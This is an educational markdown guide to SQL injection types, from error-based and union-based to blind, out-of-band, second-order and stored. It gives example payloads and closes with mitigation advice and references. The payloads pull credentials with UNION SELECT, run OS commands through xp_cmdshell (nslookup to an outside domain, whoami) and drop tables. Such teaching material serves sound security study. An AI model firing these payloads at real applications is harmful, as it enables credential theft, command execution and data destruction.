# SQL Injection (SQLi) Pen-Testing Guide

## Table of Contents

1. [Introduction](#introduction)
2. [Identification Methods](#identification-methods)
    - [Error-Based SQLi](#error-based-sqli)
    - [Union-Based SQLi](#union-based-sqli)
    - [Blind SQLi](#blind-sqli)
        - [Boolean-Based Blind SQLi](#boolean-based-blind-sqli)
        - [Inferential-Based Blind SQLi](#inferential-based-blind-sqli)
    - [Time-Based Blind SQLi](#time-based-blind-sqli)
    - [Out-of-Band SQLi](#out-of-band-sqli)
    - [Second-Order SQLi](#second-order-sqli)
    - [Stored SQLi](#stored-sqli)
    - [Parameter Injection](#parameter-injection)
3. [Mitigation](#mitigation)
4. [References](#references)

---

## INTRODUCTION
SQL Injection (SQLi) is a serious security vulnerability that allows attackers to execute arbitrary SQL queries in a database. This document provides methods for identifying various types of SQL injection vulnerabilities.

## Identification Methods
### 1. [Error-Based SQLi](/SQL-Injection-Types/Error-Based-SQLi.md)

**Error-based SQLi** exploits error messages the database returns to gather information about its structure. To **perform** Error-based SQLi inject SQL payloads that generate database errors and observe the responses. To **detect** it, look for error messages or unexpected behavior that reveals database details.
 Here are some **Example Payloads**:
  ```SQL
  ' OR '1'='1
  ' AND 1=CONVERT(int, (SELECT @@version))--
  ```
  ---
### 2. [Union-Based SQLi](/SQL-Injection-Types/Union-Based-SQLi.md)
**Union-based SQLi** uses the UNION SQL operator to retrieve data from multiple queries. To **perform** Union-Based SQLi, test if the parameter can combine results using UNION. To **detect** it, adjust the number of columns to match the original query and check if you can retrieve data from different tables or columns. Here are some **Example Payloads**:
  ```SQL
  ' UNION SELECT NULL, username, password FROM users--
  ' UNION SELECT NULL, table_name, column_name FROM information_schema.columns--
  ```
---
### 3. Blind SQLi
**Blind SQLi** occurs when database errors are not visible, and inference is needed based on application behavior.  There are 3 types of Blind SQL Injections.

#### 3.1 Boolean-Based Blind SQLi
To **perform** it, Inject payloads that evaluate to true or false analyze application responses and Observe differences in the application's output to determine if the condition affects the response to **detect** it. Here are some **Example Payloads**:
  ```SQL
  ' AND 1=1--
  ' AND 1=2--
  ```
#### 3.2 Inferential-Based Blind SQLi
To **perform** it, Use payloads to infer database information based on application responses and Observe changes in responses based on injected payloads to infer details about database fields to **detect** it. Here are some **Example Payloads**:
  ```SQL
  ' AND LENGTH(@@version) > 5--
  ' AND ASCII(SUBSTRING(@@version,1,1)) > 65--
  ```
#### 3.3 Time-Based Blind SQLi
To **perform** it, Inject payloads that induce a delay measure response times, and Measure if the response time changes according to the payload, indicating successful execution to **detect** it. Here are some **Example Payloads**:
  ```SQL
  ' OR IF(1=1, SLEEP(5), 0)--
  ' OR IF(1=2, SLEEP(5), 0)--
  ```
  ---
### 4. Out-of-Band SQLi
**Out-of-Band SQLi** involves interactions with external resources like DNS or HTTP requests. To **perform** it, use payloads that trigger external requests and monitor these interactions. To **detect** it, Check for incoming requests to external resources (e.g., DNS lookups) to see if the application is making outbound connections. Here are some **Example Payloads**:
  ```SQL
  ' OR 1=1; EXEC xp_cmdshell('nslookup mydomain.com')--
  ```
  ---
### 5. Second-Order SQLi
**Second-order SQLi** occurs when user input is stored and later used in SQL queries. To **perform** it, Inject payloads into storage fields and check if they execute later. To **detect** it, Test data retrieval points where the stored input is used to see if the payload executes. Here are some **Example Payloads**:
  ```SQL
  ' OR 1=1; DROP TABLE users;--
  ```
  ---
### 6. Stored SQLi
**Stored SQLi** is when the SQL injection payload is stored and executed from the database. To **perform** it, Inject payloads into storage fields and verify if they execute when the data is retrieved. To **detect** it, Observe if the payload affects the application when stored data is used or retrieved. Here are some **Example Payloads**:
  ```SQL
  '; DROP TABLE users;--
  ```
  ---
### 7. Parameter Injection
**Parameter Injection** involves manipulating query parameters to test for injection points. To **perform** it, Alter parameters to inject SQL commands and observe the results. To **detect** it, Check if the application processes injected SQL commands by analyzing changes in output or behavior. Here are some **Example Payloads**:
  ```SQL
  id=1' OR '1'='1
  search=%'; EXEC xp_cmdshell('whoami')--
  ```
## Mitigation

1. **Use Prepared Statements**: Employ parameterized queries or prepared statements to prevent SQLi.
2. **Employ ORM**: Use Object-Relational Mappers (ORMs) that help prevent SQLi.
3. **Input Validation**: Implement strict validation and sanitization of user inputs.
4. **Error Handling**: Avoid exposing detailed database error messages to users.
5. **Regular Security Audits**: Conduct periodic security assessments and code reviews.

## References

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [SQL Injection Cheat Sheet - OWASP](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [Burp Suite Documentation](https://portswigger.net/burp/documentation)
- [TryHackMe SQL Injection Room](https://tryhackme.com/room/sqlinjection)
- [TryHackMe Advanced SQL Injection Room](https://tryhackme.com/room/advancedsqlinjection)
